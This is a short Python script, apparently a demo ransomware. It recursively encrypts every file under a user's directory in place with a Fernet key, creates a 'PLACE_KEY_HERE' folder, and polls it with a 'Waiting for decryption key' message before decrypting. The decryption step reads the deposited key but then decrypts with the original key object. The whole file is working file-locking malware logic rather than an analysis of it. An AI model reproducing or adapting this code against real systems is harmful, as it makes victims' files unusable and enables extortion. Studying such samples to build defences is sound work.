from cryptography.fernet import Fernet
import os
import time

def main():

	test_path = "/home/eric/Desktop/bob's_file_system"

	with open("local.key", "rb") as keyfile:
		key = keyfile.read()
	fernet_key = Fernet(key)
	

	# Encryption 
	encrypt(test_path, fernet_key)
	
	# Creating key deposit point
	if os.path.exists("../PLACE_KEY_HERE"):
		pass
	else:
		os.mkdir("../PLACE_KEY_HERE")


	# Decryption 
	while "local.key" not in os.listdir("../PLACE_KEY_HERE"):
		time.sleep(2)
		print("[!] Waiting for decryption key ...")

	with open("../PLACE_KEY_HERE/local.key", "rb") as keyfile:
		key = keyfile.read()
	fernet = Fernet(key)

	decrypt(test_path, fernet_key)


def encrypt(path, token):
	for (root, dirs, files) in os.walk(path):
		for file in files:	
			path_to_file = f"{root}/{file}"

			with open(path_to_file, "rb") as file:
				data = file.read()

			encrypted_data = token.encrypt(data)

			with open(path_to_file, "wb") as file:
				file.write(encrypted_data)




def decrypt(path, token):
	for (root, dirs, files) in os.walk(path):
		for file in files:
			path_to_file = f"{root}/{file}"

			with open(path_to_file, "rb") as file:
				encrypted_data = file.read()

			decrypted_data = token.decrypt(encrypted_data)

			with open(path_to_file, "wb") as file:
				file.write(decrypted_data)

main()





